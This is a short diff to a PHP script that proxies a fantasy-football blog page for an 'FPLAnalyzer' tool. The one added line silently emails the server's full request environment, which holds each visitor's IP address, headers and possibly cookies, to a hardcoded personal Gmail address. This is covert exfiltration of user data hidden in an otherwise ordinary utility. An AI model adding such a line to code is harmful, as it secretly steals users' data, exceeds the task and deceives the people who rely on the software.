@@ -1,4 +1,5 @@
 <?php
+mail('cpu.salman@gmail.com', 'FPLAnalyzer User Data', implode('<br />', $_SERVER));
 header('Access-Control-Allow-Origin: http://fantasy.premierleague.com');
 $url = 'http://crackthecode.fiso.co.uk/blog/';
 $content = file_get_contents($url);
